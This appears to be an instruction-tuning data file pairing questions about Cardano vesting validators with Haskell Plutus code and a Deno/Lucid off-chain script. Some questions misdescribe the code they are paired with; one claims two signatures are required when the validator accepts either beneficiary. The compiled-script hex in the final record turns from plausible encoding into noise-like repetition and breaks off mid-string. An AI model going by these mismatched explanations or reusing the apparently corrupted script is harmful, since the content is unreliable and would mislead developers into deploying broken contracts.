{"text": "<s>[INST] How does a validator determine if either beneficiary has signed the transaction at the correct time (before or after a deadline) using time checks on signatures and transaction details? [/INST] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} {-# LANGUAGE TypeApplications  #-} {-# LANGUAGE TypeFamilies      #-} module Homework1 where import Plutus.V2.Ledger.Api import Plutus.V2.Ledger.Contexts (txSignedBy) import Plutus.V1.Ledger.Interval import PlutusTx (compile, unstableMakeIsData) import PlutusTx.Prelude (traceIfFalse, Bool(..), (||), (&&), (+)) import Utilities (wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data VestingDatum = VestingDatum { beneficiary1 :: PubKeyHash , beneficiary2 :: PubKeyHash , deadline     :: POSIXTime } unstableMakeIsData ''VestingDatum {-# INLINABLE mkVestingValidator #-} -- This should validate if either beneficiary1 has signed the transaction and the current slot is before or at the deadline -- or if beneficiary2 has signed the transaction and the deadline has passed. mkVestingValidator :: VestingDatum -> () -> ScriptContext -> Bool mkVestingValidator dat () ctx = traceIfFalse \"Benificiary1 did not sign or to late\" checkCondition1 || traceIfFalse \"Benificiary2 did not sign or is to early\" checkCondition2 where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange  = txInfoValidRange txInfo checkCondition1 :: Bool checkCondition1 = txSignedBy txInfo (beneficiary1 dat) && contains (to (deadline dat)) txValidRange checkCondition2 :: Bool checkCondition2 = txSignedBy txInfo (beneficiary2 dat) && contains (from (1 + deadline dat)) txValidRange {-# INLINABLE  mkWrappedVestingValidator #-} mkWrappedVestingValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedVestingValidator = wrapValidator mkVestingValidator validator :: Validator validator = mkValidatorScript $$(compile [|| mkWrappedVestingValidator ||])"}
{"text": "<s>[INST] How does a validator check if a transaction has a signature from a specified beneficiary and if a deadline has passed, using checks on signatures and transaction details? [/INST] {-# LANGUAGE DataKinds             #-} {-# LANGUAGE MultiParamTypeClasses #-} {-# LANGUAGE NoImplicitPrelude     #-} {-# LANGUAGE OverloadedStrings     #-} {-# LANGUAGE ScopedTypeVariables   #-} {-# LANGUAGE TemplateHaskell       #-} module Homework2 where import Plutus.V2.Ledger.Api import Plutus.V2.Ledger.Contexts import Plutus.V1.Ledger.Interval import PlutusTx (applyCode, compile, liftCode) import PlutusTx.Prelude (Bool(..), (.), traceIfFalse, (&&)) import Utilities (wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ {-# INLINABLE mkParameterizedVestingValidator #-} -- This should validate if the transaction has a signature from the parameterized beneficiary and the deadline has passed. mkParameterizedVestingValidator :: PubKeyHash -> POSIXTime -> () -> ScriptContext -> Bool mkParameterizedVestingValidator beneficiary deadline () ctx = traceIfFalse \"not signed by beneficiary\" checkSig && traceIfFalse \"deadline has not passed yet\" checkDeadline where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange  = txInfoValidRange txInfo checkSig :: Bool checkSig = txSignedBy txInfo beneficiary checkDeadline :: Bool checkDeadline = contains (from deadline) txValidRange {-# INLINABLE  mkWrappedParameterizedVestingValidator #-} mkWrappedParameterizedVestingValidator :: PubKeyHash -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedParameterizedVestingValidator = wrapValidator . mkParameterizedVestingValidator validator :: PubKeyHash -> Validator validator beneficiary = mkValidatorScript ($$(compile [|| mkWrappedParameterizedVestingValidator ||]) `applyCode` liftCode beneficiary)"}
{"text": "<s>[INST] How does a validator determine if a transaction has been signed by a specific beneficiary and if the deadline for that beneficiary has passed, using checks on the transaction and its parameters? [/INST] {-# LANGUAGE DataKinds             #-} {-# LANGUAGE MultiParamTypeClasses #-} {-# LANGUAGE NoImplicitPrelude     #-} {-# LANGUAGE OverloadedStrings     #-} {-# LANGUAGE ScopedTypeVariables   #-} {-# LANGUAGE TemplateHaskell       #-} module ParameterizedVesting where import           Plutus.V1.Ledger.Interval (contains) import           Plutus.V2.Ledger.Api      (BuiltinData, POSIXTime, PubKeyHash, ScriptContext (scriptContextTxInfo), TxInfo (txInfoValidRange), Validator, from, mkValidatorScript) import           Plutus.V2.Ledger.Contexts (txSignedBy) import           PlutusTx                  (applyCode, compile, liftCode, makeLift) import           PlutusTx.Prelude          (Bool, traceIfFalse, ($), (&&), (.) ) import           Prelude                   (IO) import           Utilities                 (writeValidatorToFile, wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data VestingParams = VestingParams { beneficiary :: PubKeyHash , deadline    :: POSIXTime } makeLift ''VestingParams {-# INLINABLE mkParameterizedVestingValidator #-} mkParameterizedVestingValidator :: VestingParams -> () -> () -> ScriptContext -> Bool mkParameterizedVestingValidator params () () ctx = traceIfFalse \"beneficiary's signature missing\" signedByBeneficiary && traceIfFalse \"deadline not reached\" deadlineReached where info :: TxInfo info = scriptContextTxInfo ctx signedByBeneficiary :: Bool signedByBeneficiary = txSignedBy info $ beneficiary params deadlineReached :: Bool deadlineReached = contains (from $ deadline params) $ txInfoValidRange info {-# INLINABLE  mkWrappedParameterizedVestingValidator #-} mkWrappedParameterizedVestingValidator :: VestingParams -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedParameterizedVestingValidator = wrapValidator . mkParameterizedVestingValidator validator :: VestingParams -> Validator validator params = mkValidatorScript ($$(compile [|| mkWrappedParameterizedVestingValidator ||]) `applyCode` liftCode params) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: VestingParams -> IO () saveVal = writeValidatorToFile \"./assets/parameterized-vesting.plutus\" . validator"}
{"text": "<s>[INST] How does the Vesting Validator check if a transaction has been signed by a specific beneficiary and if the deadline for that beneficiary has passed, using checks on signatures and transaction details, and how can the validator be written to a file or be displayed in JSON format using the writeValidatorToFile and printDataToJSON functions? [/INST] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} module Vesting where import           Data.Maybe                (fromJust) import           Plutus.V1.Ledger.Interval (contains) import           Plutus.V2.Ledger.Api      (BuiltinData, POSIXTime, PubKeyHash, ScriptContext (scriptContextTxInfo), TxInfo (txInfoValidRange), Validator, from, mkValidatorScript) import           Plutus.V2.Ledger.Contexts (txSignedBy) import           PlutusTx                  (compile, unstableMakeIsData) import           PlutusTx.Prelude          (Bool, traceIfFalse, ($), (&&)) import           Prelude                   (IO, String) import           Utilities                 (Network, posixTimeFromIso8601, printDataToJSON, validatorAddressBech32, writeValidatorToFile, wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data VestingDatum = VestingDatum { beneficiary :: PubKeyHash , deadline    :: POSIXTime } unstableMakeIsData ''VestingDatum {-# INLINABLE mkVestingValidator #-} mkVestingValidator :: VestingDatum -> () -> ScriptContext -> Bool mkVestingValidator dat () ctx = traceIfFalse \"beneficiary's signature missing\" signedByBeneficiary && traceIfFalse \"deadline not reached\" deadlineReached where info :: TxInfo info = scriptContextTxInfo ctx signedByBeneficiary :: Bool signedByBeneficiary = txSignedBy info $ beneficiary dat deadlineReached :: Bool deadlineReached = contains (from $ deadline dat) $ txInfoValidRange info {-# INLINABLE  mkWrappedVestingValidator #-} mkWrappedVestingValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedVestingValidator = wrapValidator mkVestingValidator validator :: Validator validator = mkValidatorScript $$(compile [|| mkWrappedVestingValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/vesting.plutus\" validator vestingAddressBech32 :: Network -> String vestingAddressBech32 network = validatorAddressBech32 network validator printVestingDatumJSON :: PubKeyHash -> String -> IO () printVestingDatumJSON pkh time = printDataToJSON $ VestingDatum { beneficiary = pkh , deadline    = fromJust $ posixTimeFromIso8601 time }"}
{"text": "<s>[INST] How does the Mistery Validator ensure that two signatures are received from different beneficiaries, one of which can be late while the other must be timely, and how can the validator be saved to a file or display the data in JSON format? [/INST] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} {-# LANGUAGE TypeApplications  #-} {-# LANGUAGE TypeFamilies      #-} module Homework1 where import           Data.Maybe                (fromJust) import           Plutus.V1.Ledger.Interval (contains, to) import           Plutus.V2.Ledger.Api      (BuiltinData, POSIXTime, POSIXTimeRange, PubKeyHash, ScriptContext (scriptContextTxInfo), TxInfo (txInfoValidRange), Validator, from, mkValidatorScript) import           Plutus.V2.Ledger.Contexts (txSignedBy) import           PlutusTx                  (compile, unstableMakeIsData) import           PlutusTx.Prelude          (Bool, traceIfFalse, ($), (&&), (+), (||)) import           Prelude                   (IO, String) import           Utilities                 (Network, posixTimeFromIso8601, printDataToJSON, validatorAddressBech32, wrapValidator, writeValidatorToFile) --------------------------------------------------------------------------------------------------- ------------------------------------------ PROMPT ------------------------------------------------- {- 1- Figure out what this (already finished) validator does using all the tools at your disposal. 2- Write the off-chain code necessary to cover all possible interactions with the validator using the off-chain tool of your choosing. HINT: If you get stuck, take a look at Week03's lecture -} --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data MisteryDatum = MisteryDatum { beneficiary1 :: PubKeyHash , beneficiary2 :: PubKeyHash , deadline     :: POSIXTime } unstableMakeIsData ''MisteryDatum {-# INLINABLE mkMisteryValidator #-} mkMisteryValidator :: MisteryDatum -> () -> ScriptContext -> Bool mkMisteryValidator dat () ctx = traceIfFalse \"Benificiary1 did not sign or to late\" checkCondition1 || traceIfFalse \"Benificiary2 did not sign or is to early\" checkCondition2 where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange  = txInfoValidRange txInfo checkCondition1 :: Bool checkCondition1 = txSignedBy txInfo (beneficiary1 dat) && contains (to (deadline dat)) txValidRange checkCondition2 :: Bool checkCondition2 = txSignedBy txInfo (beneficiary2 dat) && contains (from (1 + deadline dat)) txValidRange {-# INLINABLE  mkWrappedMisteryValidator #-} mkWrappedMisteryValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedMisteryValidator = wrapValidator mkMisteryValidator validator :: Validator validator = mkValidatorScript $$(compile [|| mkWrappedMisteryValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/mistery1.plutus\" validator misteryAddressBech32 :: Network -> String misteryAddressBech32 network = validatorAddressBech32 network validator printMisteryDatumJSON :: PubKeyHash -> PubKeyHash -> String -> IO () printMisteryDatumJSON pkh1 pkh2 time = printDataToJSON $ MisteryDatum { beneficiary1 = pkh1 , beneficiary2 = pkh2 , deadline    = fromJust $ posixTimeFromIso8601 time }"}
{"text": "<s>[INST] How does the Parameterized Mistery Validator ensure that a transaction has been signed by a specified beneficiary and that the deadline for that beneficiary has passed, using checks on the transaction and its parameters, and how can the validator be written to a file with different beneficiaries? [/INST] {-# LANGUAGE DataKinds             #-} {-# LANGUAGE MultiParamTypeClasses #-} {-# LANGUAGE NoImplicitPrelude     #-} {-# LANGUAGE OverloadedStrings     #-} {-# LANGUAGE ScopedTypeVariables   #-} {-# LANGUAGE TemplateHaskell       #-} module Homework2 where import           Plutus.V1.Ledger.Interval (contains) import           Plutus.V2.Ledger.Api import           Plutus.V2.Ledger.Contexts (txSignedBy) import           PlutusTx                  (applyCode, compile, liftCode) import           PlutusTx.Prelude          (Bool (..), traceIfFalse, (&&), (.) ) import           Prelude                   (IO) import           Utilities                 (wrapValidator, writeValidatorToFile) --------------------------------------------------------------------------------------------------- ------------------------------------------ PROMPT ------------------------------------------------- {- 1- Figure out what this (already finished) validator does using all the tools at your disposal. 2- Write the off-chain code necessary to cover all possible interactions with the validator using the off-chain tool of your choosing. HINT: If you get stuck, take a look at Week03's lecture -} --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ {-# INLINABLE mkParameterizedMisteryValidator #-} mkParameterizedMisteryValidator :: PubKeyHash -> POSIXTime -> () -> ScriptContext -> Bool mkParameterizedMisteryValidator beneficiary deadline () ctx = traceIfFalse \"not signed by beneficiary\" checkSig && traceIfFalse \"deadline has not passed yet\" checkDeadline where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange  = txInfoValidRange txInfo checkSig :: Bool checkSig = txSignedBy txInfo beneficiary checkDeadline :: Bool checkDeadline = contains (from deadline) txValidRange {-# INLINABLE  mkWrappedParameterizedMisteryValidator #-} mkWrappedParameterizedMisteryValidator :: PubKeyHash -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedParameterizedMisteryValidator = wrapValidator . mkParameterizedMisteryValidator validator :: PubKeyHash -> Validator validator beneficiary = mkValidatorScript ($$(compile [|| mkWrappedParameterizedMisteryValidator ||]) `applyCode` liftCode beneficiary) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: PubKeyHash -> IO () saveVal = writeValidatorToFile \"./assets/parameterized-Mistery.plutus\" . validator"}
{"text": "<s>[INST] Can you explain the process by which the vesting contract is set up, including how the datum is created and used, and how funds can be vested and claimed? [/INST] import { Data, Lucid, Blockfrost, getAddressDetails, SpendingValidator, TxHash, Datum, UTxO, Address, AddressDetails, } from \"https://deno.land/x/lucid@0.9.1/mod.ts\"; import { secretSeed } from \"./seed.ts\"; const lucid = await Lucid.new(new Blockfrost(\"https://cardano-preprod.blockfrost.io/api/v0\", \"insert you own api key here\"), \"Preprod\"); lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(addr); const vestingScript: SpendingValidator = { type: \"PlutusV2\", script: \"590b30590b2d0100003232323322323233223232323232323233223233223232323232323232333222323232322323222323253353232323253355335323235002222222222222533533355301a12001321233001225335002210031001002502c25335333573466e3c0380040ec0e84d40b8004540b4010840ec40e4d401488009400440b04cd5ce2491f62656e65666963696172792773207369676e6174757265206d697373696e670002b15335323232350022235002223500522350022253335333501900b00600215335001153350051333501800b00300710361333501800b00300710361333501800b00300735500322222222222200533501433501635029350052200102d335015502802d123333333300122333573466e1c0080040bc0b8894cd4ccd5cd19b8700200102f02e101515335333573466e240080040bc0b8404c405088ccd5cd19b8800200102f02e22333573466e240080040bc0b888ccd5cd19b8900200102e02f22333573466e200080040b80bc894cd4ccd5cd19b8900200102f02e10011002225335333573466e240080040bc0b84008400440b04cd5ce248114646561646c696e65206e6f7420726561636865640002b102b135001220023333573466e1cd55cea80224000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd408c090d5d0a80619a8118121aba1500b33502302535742a014666aa04eeb94098d5d0a804999aa813bae502635742a01066a0460606ae85401cccd5409c0c5d69aba150063232323333573466e1cd55cea80124000466a0486464646666ae68cdc39aab9d5002480008cd40a8cd40edd69aba15002303e357426ae8940088c98c8100cd5ce02182101f09aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa0049000119a81499a81dbad35742a004607c6ae84d5d1280111931902019ab9c04304203e135573ca00226ea8004d5d09aba2500223263203c33573807e07c07426aae7940044dd50009aba1500533502375c6ae854010ccd5409c0b48004d5d0a801999aa813bae200135742a004605e6ae84d5d1280111931901c19ab9c03b03a036135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a008603e6ae84d5d1280211931901519ab9c02d02c0283333573466e1cd55ce9baa0054800080ac8c98c80a4cd5ce0160158139999ab9a3370e6aae7540192000233221233001003002375c6ae854018dd69aba135744a00c464c6405066ae700ac0a809840a44c98c809ccd5ce2490350543500029135573ca00226ea80044d55cf280089baa00132001355023221122253350011350032200122133350052200230040023335530071200100500400112223500222350032253335333500800700400215335003100110261025102612223232323253335006215333500621533350082130044984c00d261533350072130044984c00d26100d100b1533350072130044984c00d261533350062130044984c00d26100c1533350052100a100b100915333500521533350072130054984c011261533350062130054984c01126100c100a1533350062130054984c011261533350052130054984c01126100b2533350052153335007215333500721333500b00a002001161616100b153335006215333500621333500a009002001161616100a10092533350042153335006215333500621333500a009002001161616100a1533350052153335005213335009008002001161616100910082533350032153335005215333500521333500900800200116161610091533350042153335004213335008007002001161616100810072533350022153335004215333500421333500800700200116161610081533350032153335003213335007006002001161616100710061235001222222220071222003122200212220011221233001003002122123300100300212212330010030021232230023758002640026aa034446666aae7c004940288cd4024c010d5d080118019aba200201a232323333573466e1cd55cea80124000466442466002006004601c6ae854008c014d5d09aba2500223263201833573803603402c26aae7940044dd50009191919191999ab9a3370e6aae75401120002333322221233330010050040030023232323333573466e1cd55cea80124000466442466002006004602e6ae854008cd403c058d5d09aba2500223263201d33573804003e03626aae7940044dd50009aba150043335500875ca00e6ae85400cc8c8c8cccd5cd19b875001480108c84888c008010d5d09aab9e500323333573466e1d4009200223212223001004375c6ae84d55cf280211999ab9a3370ea00690001091100191931900f99ab9c02202101d01c01b135573aa00226ea8004d5d0a80119a805bae357426ae8940088c98c8064cd5ce00e00d80b89aba25001135744a00226aae7940044dd5000899aa800bae75a224464460046eac004c8004d5405c88c8cccd55cf80112804119a8039991091980080180118031aab9d5002300535573ca00460086ae8800c0604d5d080088910010910911980080200189119191999ab9a3370ea002900011a80398029aba135573ca00646666ae68cdc3a801240044a00e464c6402866ae7005c0580480444d55cea80089baa0011212230020031122001232323333573466e1d400520062321222230040053007357426aae79400c8cccd5cd19b875007480008c848888888c014020c038d5d09aab9e500c23263201533573803002e02602402202001e01c01a26aae7540104d55cf280189aab9e5002135573ca00226ea80048c8c8c8c8cccd5cd19b875001480088ccc888488ccc00401401000cdd69aba15004375a6ae85400cdd69aba135744a00c466666ae68cdc39aab9e50022756303008000002c8e1aabaa00315e4534245600000b5235e5342516e6400010053003436366e7575e53d4961520e1c008013758003007ccdeeb4906200e8355c023071800f5e5d4b9ea305a51b00c011023020047c843066c071904003b3ea00223e4d540880030bb4800c02311222300331126001b0030110040027dbe535ff09c00000260520000000000001e636c6d00396e6b3e4b1e48000694e0008ff8880a8a1a7d5355da003b3e004e38217a8023ea00352535533300a1736000427300022dd0b19c1200390ea0022e79e3a112c00253f33405353746e1802003320008c44c3a7b01003333573466e200060090a1ae23e4003c3522230001e004520035e03cbb3a2111e753b8aa91c220089aa1b8a14d0601ae0076110500836800a1c2213e02333560014e81c19e00352f3b03535567340b1e000002d5b00584c22b1e23a01d0006f572235a211d23e4d5401a00ae330111f6820005b8451220032224e5601c6f6c000e4c22c03f23770d1c720093330023036b0406f3e5a04c6c5f350f24446c045b043d2114d5d0a80199a805b330011c355744aa1e2285e94a1e2430320059a81a5e0048053e000002a00229a8aa621cfa00321f706046e8a00004caa810a005d9a0b4f23ea001e24303200580d780a0022a79e00484b2a980c01c006c7e0019e7506d0335a9e00004b6d9a0022a845ff0007b8033457547c90005c9000b4a00357a0063322a87d5e0a80d201005e7e00005b8209a2609d0132543d990022d20e7d8c200325500d070dd1a0033d03c035204c50002a8e0800000097e00b00000323337353743660000b0374347001e000000092a470033252a7d5b82e037393348a123100011a8002298a9a8a5a8a00c6d1a01491e0002d2034009a17b0d3224e54dba4c3b8a004d40000113f055e009e026d9e43506a45302012331e2c28a2d4d4a4b038024d03a038b023120e02804d80208293e42226c7e02881b6228a2e91c28d902a002d50002c2f0e000035a02a212e001a028e40000185f40a0a0d22e67000900922a92a0388d2d035d0a2d08e501d440ea019fa0413d013e68a05d06ea050e0205c103022b680f20a03840022a1a0212e1900918d08a38a0080b5e1e0035457e63d0022222e60e00b2b092b9302c0d2901043080031c190088d003b5d7d023111001001900008e0c0180241f00713b009236a11c80012d43025d501b41c8002d05880b01279e4d4003c4d7d8d0230335560d6e00324400c01d758000252e002e04e20026200e1d9e8e007f3e002260f03f302df9e004d752e1c27f032034c68a235006f930006000050023422e1e0099088a14e6a1e7a9d0282006b004c2b08e0c076003310c62a0c0930b022b6d03e5a1008f45e5a9e83cda020e0b9a07441e042275f14d500e085ec0b6ea0040131000000200039a1c13b82390360021c059c02606400f004a0030b75c05c87a1c02702805d024e0019e9c030740000b50d4007a0e88aa081d005400054e006302d6800b3d5d0a8e3000245d7e0028b0267082e070c08441c8d0132097a029013540097a81e5403d0086a235013e7a09b33d00562d0801a18004700448e1005c18002685a6aab8a90802c60c09300e4c4c8e0a2004c007009c750010b5d035e90d4b81a013403b11a0018a014d9d7008f05b6d2000073e00480002838e1f079dd3002c3e8002b5002340445b83a3003700172a8c00d01a9b0504b7c8c7d0056002c8c9000280454b2e3e0e0d7f0313e00020402004000253b00004d9e0b903b02400a601008402d20b0057d0b902052b20009a8a03753a0095010c0089d50309b4255e4300125f000081c9f36b7d8200138520a82a00d1701f2433002820040067503f2a6d9e0000a7e5030469d540a0824b34e810007d4533e7d34000880333d3000c12009d0c3d4a1e6000c16c40e20007e03f4240284d0e402800200013f000804c8e81e0b21005b03e4d7f0230202069c06002b1b283aa02c83d087d0b0268c12009d00300882007dce000090ee2200209c70020d505201053bb0d0105d4605002a0203e502025e032200b8c8c05c03004d8040080094a0802c007e7e0a006044d9004b010a05500903d7002a023004d60e1e600c004007042750b050000f005035700ca0c6002dba030087102b2e05618a08608c02520020c2eab05d20735b2c1045004d50064b80010d5d06c2003d004a002d904005b003d8c0008b5d0a8e90009462e03f05d423b300054b8e062208022920000a8c0002e0090017e220e03393a60003b8c806b95d780e0b27d2055002b00b0a1d802a8c0244a20003001d006ff0a002b8000a50014b004810b022005c4a019a7f40b8e90003c61a6d5d0a8e500012b2b00c4e3e003d83000b5004b026006d64022b04a094c81d00400202001e0077103a380017809b7f9e004b6d9e00403d92015e035a6a0621d4b00028e601008040020e1d600c50004b00e8c00919b8e0826002b50d8040445d6e80b6d7d5a0244d00b008400038b6d02d004b93a330025540032304d55cf080094d0a9fcb240006d94a00620180d0b0b034a8c024dd0062006600933d0a0271e1e03a50035d4c22f91b7b1e81010001d805f7e01e1d000044800a000a8d20006a1600e07c800013c36d006b200f33001b1e023d0180207c003d0057b49e015e09d4c0139e79e041900b9d002d0a170f008027d6c700002055be80000364aa002c0048d0d00700405d020605500065e2403004e9e01500002a60260022a9d035a6d00597c0053e0035d5e0063d009b3d00143a340e2e03c40a2c0020840326c0280e16b50132b8000160e0023f3d0b007d00650105022b076a0280805b80b54e4d9e0140223507d04b0044002d0a95b0280000d2e7d0060a980b044ba0006d0059a8a6a006c01331f028061003d0a91e01d170be008cf6d004f4b800028a28e015b005b0e5e6e0058005c007c9003e003c2a0041006c1f8e82b009d0210d0023700e004b1e0144a009d025a9e001c01e9e00b80042d1a05b8d29e00430a2d00d000043a005005bb003e93d40e1006c003d00163e20067d22e018028002a7600557e190b0040602e053206c00124a3e044e12b3800240840052b080029b0700180d4b0630e4b0041000a02b1d0578c0072300e063c0050303400408042208000264d9002a1e8006a49e00d30040f4080028030004b94f00670024d100e00707034b7a007e1e0282b5e003a00b9d6a002003d9e08c8a5b0133c030030c20001426003a5d60003e1c4a0210071001e100b400080004e800007c9e001e1d0b023d0019e0068c500390ea00303b9000d8e037e0b3c8a0c005ea004003031003d0809b8000000a3d27b0502e003d0a93a1c1706e003e02a50013a003cb4d8e4000f00252b05860022004b6d9e006a2b00b8e00391e00f2f06e40159e009d0404b0130c57b0003a0240044400283e04a43c0800210000079e025600280003b05d1d022b9e004a1e00d003f5000002a0b0062d023b6000e1e0d0b0400052b0326d002b003e0c080084003f8a9e0039001902b0038d8c004c0541c1e001f8e100062009000a580010e0024e2e0066f0003b6d004b6d00e2f43002552e001e0065004b06c08c1e0005b2d00202b00b8000f0012b02800d008e003e8002607e009a5b0e02764a0070a1e0053403800a03100240067e0b2b5e011b0a2d007024ed6d1e8c02e600092b780c9d86c004001e003e1c840040a2000e8000a21d00032e028045b700d07c025b9a02400303b00104041c35080f4103d00a003d40302400680001a4052d6c004003900d23a006c1e0656038a11a2d034ee0e00032d00175b00c6f91c000f033033a10b004a8d0022006b008c65009d0674a006a080048b0480073e05307d000b43e005d43e3a2c000b4a00300037001f2900275b804b6d0027b0002000808d00605e03d026d0702006b062d08b2a00703d0900c800041900002f004003780d0e63d000202a00e002b0c6d000c40d6a1a3b028100000f9c40330034006a04d005e6e005e7a0039000233337d0044c0068d20132a000025e0405b5e00014c8a0060f002c50a005e00262d0b80a1a0001e7cfa006c6c00300058000d2c03e05b50016004e8c034800b65b2e003000e4d81a2d003501d94e03820006001d003805d7000390e200262b8a028004b033b80002a008d00382b09e12d004b3d1a013ea4200008e2b1e0022e5004a024405e00090f2a1a10000c8d003e040084004c0027d9d0029a003e7000e05d401021d1a002a330000cc3e00b8d84b2e9e7a3002000d63e0d0e001e28d104401c0033e021022700b1b0500a88b10a7002b20002105a01808cbb05027e0b8e024d91c54000072b02800d90018e0053e002e03d0e013e6200b5d1e002600006b50a009c03b00d1c40c011c503a0039006801d99a0a37c60d2002e7a0328001e08002b085ba80a011c6d80008c0136000f530019e603b5d9e0300428e0a01c3d200002f0900e0508c0380041a1a0108a98e003d9d80e0c7a003c00c1a43d5500019c2e007005b60004080b1d8c6d0024d5e000090029b41c0068029d80502c028a00500048a3e060042a04e03e00a0100a004a01000e5e010f9e050003d800029a6a008a08b96e00550004828e0040041e2d0052e1201006c2d023003f8c026c62a02d0402b9005b3b003e028e002b08a5e8033b9d006a011dd002b0004003b00315d00380002800434a0c0136c3a0a3e00224d5e013e004a8a1a007e03d580e023e21e002d960009301a0e0b003d08a0006a03e00d5b9a08015a0006a08d0e06f90013e08002c0016001a0054d50d00154e0019e5b5a1a039e002a3a015e1e8c066b8a3e04260c005b80c4000406000b5d0c0093d1a0147a2000000980006e0d009903f0009d3d003c0180e7c063e0037001b780c00e040002003f0a130d5a0e1a005403c6e003403b00602d9000e2d7d028b3b9004e002400a2d007e04e00253e80d06040d4e3a0c01605b804c004c000091c800037b00202d0089000e083b8000e5b0000278d0092d700004601e8d029b8a00d52b030a6a006201b2b0e002d009c40053e003200bc0052e03d1d8d060022b8000a009e4a1e065bd28000c0004d00370080d5e02c6d2d006c020c03e036013b30009b016a02d00130003e009c023004e8a06000203e0c006a003f5b0064d9e007600004a00b2d0004e5b80d062b0058c0001b5e04a2028d0028d8d04000a40b16b4d00005b00022a0006a00005a380003aa012c9e009b024a00560008a9d8001e000be8a040062005a012aa2e7c00b9b300037e005ed6c0040400027e2b2e00440e022d003a26003e8c0010401c2d006c05e4a039d003c009c8a0095e002bda005d0b0600601a040005b0e009a0280e001d000a00e0d8009d19e009d1e0067b003b660b200b3a60002d062b8a04a3d8d00d7b9e003d4d060b6006e001a8d003d6b900077002b3e0057007b00220073e0b19d0e1c007e09e0489e005e0019d6d003e1d0082a01002a6001b7004b6000970054c004c013e00b5b6d037c028a2e0c0026e0035bda0032c009e0033b0e003e014e4c013a003d90024002e050e018028009c040028d5e03a8a0080e00c6d6d0022c004b6d0180006e03a5d0032a1c0029a0e004e02800a4a005003c0009b5006b002d9a9e001c0278000009a00422d007e0032d03e001a009603c00e0b8002a3800007b00d7a1e02e4e003c03210001d001e02d001e00802d0034e0379e1c002e0066d00e04a0d0e005b4b9e0029b806b006d8d003c006b8e0235a003d9e01d601c0064025e002ec0a04a03a40012d7e004ae00003d98a0100428e00192a1c0e003e1d9e04005b000067d005b048030b004400b81e1c038002b1a024c019003c006f1d0090a000ab0000038000981e0074004d3d8e00b8b00020007c4e004a017c023c0037c002e008d061c03d002b8a0068a004400d1e03d003c3d1e003b2800a002d04890003d003c60023d00f2c012a022a0b8a0400380a002000280a005e0e003a0c6d0001d0b7c005d043b4e0069a009d0276d004a8a1e003e4000e0281e017b2e0064000a6c000300d20011e008a0000401a0332e00e4a003b8a3a6b90004a23a001e0076001e003e9e0046e08d00b2a000000b800a003a023e1c006c0216004d07008000e0806e003d28d006202c0056e006a5000007c5d0e0091d8e0018e00320014d0e008005e5e006b9d003d9d5a021e044d005600080b980010a00002a003e009700068d003a02e0e0042a003e0288007c0200090200a00e007c003b008800b0003d07009e4e00c2d03a060044023e006803c006001c002b002d007e003ec6e004c00c0c00d1a00a202b5b0052009a0033d021e003ed800080006b5e002b003d028b0368c0096004a1a003b004500e06d007b9d006b020c0004d0e0250e1a1a003a0600035e5e0067b005e0e0054d000045d02c003c8c0022e002800046c00e001c003a0037c0145a009b0600d6b9e002d1a002700040019003d0098d0074d003e0040030034001e006f005e6d009f0037c006d0082b0064d9a027c03a400e08e01c0b0278a003a0c002004b11a0132d029b006c003a0280a009e001a006c0033d02b005b0150009e00602a003d3400e005b9e0062000a003e0b004d1a000b2a03a1d028c1a021e066c002d002003b8e0026004b1a02b0121e02803b5b003d034c0044008c003b18e000066003b6000639d0200c4a00a100800008a00d0b8e00b81000480e00c8004a0504d033e003d028b0280b00c1a003d9e00f29005c027e003d08000c02d0399e0001e024d9d003c0d003c2a060000e8b8a0036004a5e003b02b001a8d00809b0000e03d2003d00e9e0064d0a006a9e002000d503b0038a004004500d003e0b0036b00a00350048a03e0031004a00600e80002c050a001a000032003a12009a0000b009d024e0801e002a6d0050b90006a0e008e6c003b90a023e038d1c003a001c003400780048014d028e05c000d000d9d0300039001e2d000bc0000277b400400a003900c400e00600006c0058a0039e0060a003002d023e015e003100a0e00b0038c006a0064d1e00e0024009d0d